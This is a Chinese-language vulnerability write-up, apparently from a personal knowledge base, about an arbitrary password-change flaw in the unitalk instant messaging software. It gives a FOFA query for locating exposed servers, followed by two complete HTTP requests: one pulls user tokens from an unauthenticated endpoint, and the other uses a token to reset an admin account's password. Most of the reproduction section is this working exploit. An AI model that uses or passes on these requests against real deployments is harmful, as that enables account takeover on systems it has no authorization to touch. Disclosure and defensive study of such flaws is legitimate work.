# unitalk存在任意用户密码修改漏洞

# 一、漏洞简介
unitalk是一款即时通讯软件，unitalk存在任意用户密码修改

# 二、影响版本
+ unitalk

# 三、资产测绘
+ fofa`title="unitalk"`
+ 特征

![1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13.png](./img/WSajtDrdCsRNXkAS/1723520849027-9f8e29d4-1ac6-46e0-b014-eb6ac435cc13-235810.png)

# 四、漏洞复现
先获取token

```plain
POST /unitalk/v1.0/user/getallusers.json HTTP/1.1
Host: 172.18.14.68:7778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35
Content-Type: application/json;charset=UTF-8

{}
```

![1723521739904-fc153017-0a38-40a5-9656-f51032a33d77.png](./img/WSajtDrdCsRNXkAS/1723521739904-fc153017-0a38-40a5-9656-f51032a33d77-254525.png)

修改密码

```plain
POST /unitalk/v1.0/user/updateuser.json HTTP/1.1
Host: 172.18.14.68:7778
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Content-Length: 99

{"name":"admin123","role":"admin","pwd":"admin1234","token":"87535651-49c2-4a19-8aeb-401fc16c2366"}
```

![1723521732885-692972b1-b3fb-4ab3-a25e-dc1698149902.png](./img/WSajtDrdCsRNXkAS/1723521732885-692972b1-b3fb-4ab3-a25e-dc1698149902-653368.png)



> 更新: 2024-09-05 23:21:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkiwy4qgvglm28o8>